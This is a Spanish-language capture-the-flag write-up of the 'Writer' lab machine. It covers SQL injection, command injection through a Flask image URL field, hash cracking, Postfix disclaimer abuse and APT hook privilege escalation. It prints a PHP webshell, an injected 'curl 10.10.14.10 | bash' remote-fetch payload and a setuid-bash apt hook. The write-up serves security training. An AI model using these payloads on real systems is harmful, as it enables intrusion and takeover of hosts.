-----
- Tags: #sqli #sqli-errorbased #python3 #command-injection #password-crack #postfix-enumeration #cron-job #apt-config 
- -------
## Técnicas utilizadas  
- SQLi Bypass Login + SQL Injection [Database Enumeration]  
- SQLi - File System Enumeration (Abusing load_file)  
- Python Code Analysis  
- Command Injection  
- Cracking Hashes  
- Postfix Enumeration  
- Abusing Cron Job [User Pivoting]  
- Abusing apt config files [Privilege Escalation]
## Procedimiento

![[Pasted image 20230729204237.png]]

#### Reconocimiento
Si lanzamos un **nnmap** sobre la maquina victima, encontramos los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80,139,445 -oN Ports 10.10.11.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 16:53 UTC
Nmap scan report for 10.10.11.101
Host is up (0.14s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9820b9d0521f4e103a4a937e50bcb87d (RSA)
|   256 1004797a2974db28f9ffaf68dff13f34 (ECDSA)
|_  256 77c4869a9f334fda71202ce151107e8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Story Bank | Writer.HTB
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-31T16:49:39
|_  start_date: N/A
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: -4m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```

Un escaneo con **whatweb** (un **whapalyzer** a nivel de terminal) podemos ver estas tecnologías web corriendo por detrás:
```ruby
# whatweb 10.10.11.101
http://10.10.11.101 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.101], JQuery, Script, Title[Story Bank | Writer.HTB]
```

------------
#### SQLi Bypass Login + SQL Injection [Database Enumeration]  
Aplicando reconocimiento web, podemos dar con un directorio el cual nos redirige a un **login**. Este **login** es vulnerable a **SQLi**, podemos bypassear directamente la autenticación, a su vez, podemos enumerar también toda la base de datos.

---------
#### SQLi - File System Enumeration (Abusing load_file) 
Si intentamos listar archivos de la maquina con **load_file** vemos que cuela:
![[Pasted image 20230731175057.png]]

-------------------
#### Python Code Analysis  
Desde el **dashboard** administrativo podemos editar un usuario, al parecer, podemos subir una imagen con extension **PHP**,  el archivo estaria tal que asi `pwned.png.php` y dentro tendria el tipico **webshell**:
```php
<?php system($_REQUEST['cmd']); ?>
```

Estas imagenes se almacenan en **/static/img** que de primeras, tenemos capacidad de directory listing, pero, al intentar ejecutar comandos no vamos a poder dado que esta intentando interpretar una imagen y no un **PHP**.

Leyendo archivos a través del SQLi, podemos llegar a dar con un script en python (lo sacamos del /etc/apache2/sites-enabled/000-default.conf).

El contenido de este script es el siguiente:
```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/&lt;id&gt;', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/&lt;id&gt;', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/&lt;id&gt;', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/istrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
```

Dentro de este hacen alución a un archivo `__init__.py` el cual coexiste en la misma carpeta, solo que en el subdirectorio **/writer**. Dentro de este archivo, nos damos cuenta de que el servidor por detrás esta corriendo **Flask** y este, suele ser vulnerable a **SSTI**, además, vemos un **passwrd**.

Leyendo un poco más este archivo, encontramos la ruta de donde editabamos y donde también podiamos subir una imagen:
![[Pasted image 20230731183328.png]]

Vemos que hay un error, dado que hay un parametro que se esta tramitando por POST de nombre **image_url** el cual esta tratando de leer un archivo de un servidor, cuando esto sucede, ejecuta un comando a nivel de sistema para mover al archivo a una carpeta temporal:
![[Pasted image 20230731183359.png]]

-----------
#### Command Injection  
Bien, digo que es un error dado que esta pasando nuestro **input** de usuario a una ejecucion remota de comandos con **os.sytem()**. En el proceso, nos encontraremos con un solo problema, pero lo podremos soluciona si utilizamos **wrappers** como por ejemplo, el **file://**. 
Lo que haremos sera, subir un archivo que contenga como extension **.jpg** pero le colaremos a la vez un comando a nivel de sistema, dado que en el script solo se valida que exista la extension a valor de string, el archivo quedaria tal que asi:
```
touch pwned.jpg; curl 10.10.14.10 | bash ;
```

Ahora, desde burpsuite capturamos la solicitud de subida de imagen y en el parametro **image_url** colaremos la ruta absoluta del archivo:
```
file:///var/www/writer.htb/writer/static/img/pwned.jpg; curl 10.10.14.10 | bash ;
```

y ahora solo quedaria ponernos en escucha y entablarnos una reverse shell.

-------
#### Cracking Hashes
Si leemos los archivos de configuración de **MariaDB** podemos llegar a dar con unas credenciales:
![[Pasted image 20230731184110.png]]

Podemos iniciar sesión en **mysql** con estas y desde aqui enumerar la base de datos. Dentro de esta, podemos encontrar la contraseña hasheada de **Kyle** la cual podemos intentar romper con **John** o **Hashcat**

**hashcat**:
```
# hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
```

**john**:
```
# john hash.txt -w=/usr/share/wordlists/rockyou.txt
```

La contraseña resultante nos permite autenticarnos como **Kyle**.

---------
#### Postfix Enumeration
Listando los grupos a los que pertecenemos, encontramos dos:
```
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

Buscando por archivos con los cuales podemos interactuar con nuestro grupo encontramos algunos:
```
kyle@writer:~$ find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter
```

Listando el archivo **disclaimer** del directorio **postfix** podemos encontrar el siguiente script en bash:
```bash
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail
# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69
# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15
# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }
cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`
if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi
$SENDMAIL "$@" <in.$$
exit $?
```

Además, este hare referencia a otro archivo el cual contiene 2 usuarios a los cuales al parecer les manda un correo:
```
kyle@writer:~$ cat /etc/postfix/disclaimer_addresses
root@writer.htb
kyle@writer.htb
```

--------
#### Abusing Cron Job [User Pivoting]  
Pues bien, si enumeramos comandos que se ejecutan en intervalos regulares de tiempo, vemos que root restaura el archivo a su contenido original:
![[Pasted image 20230731185919.png]]

Si buscamos en [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp) como abusar de postfix, vemos que hacen referencia a un archivo **/etc/postfix/master.cf** el cual contiene archivos a ejecutar, es por eso que el archivo **disclaimer** se ejecuta como el usuario **John**.

Ahora, lo que tenemos que hacer es mandar un correo a algunos de los correos disponibles que enumeramos con anterioridad. Para hacer esto, nos podemos apoyar de este script en **python** que nos automatiza el mandar el correo:
```python
import smtplib

smtp_server = "127.0.0.1"
port = 25
sender_email = "kyle@writer.htb"
receiver_email = "kyle@writer.htb"
message = "caca"
try:
    server = smtplib.SMTP(smtp_server,port)
	server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    # Print any error messages to stdout
    print(e)
finally:
    server.quit() 
```

Bueno, ahora solo queda modificar el **disclaimer** para entablarnos una **reverse shell** o meter nuestra **id_rsa.pub** dentro de sus claves autorizadas para poder conectarnos sin contraseña, mandas el email, y el comando definido en el **disclaimer** se deberia de ejecutar.

------------
#### Abusing apt config files [Privilege Escalation]
Listando ahora los grupos asignados para este usuario, encontramos el de **managment** el cual, tiene permisos sobre el archivo **apt.conf.d**:
```
Image File Permissions
```

Bien, pues si recordabamos, en el **Pspy** veiamos tambien que **root** estaba ejecutando cada cierto tiempo un **apt update**, entonces, podemos abusar de esto creando un archivo malicioso con el siguiente contenido:
```
APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};
```

Nos queda esperar que se ejecute **apt** y hacer un **bash -p** para ser root.
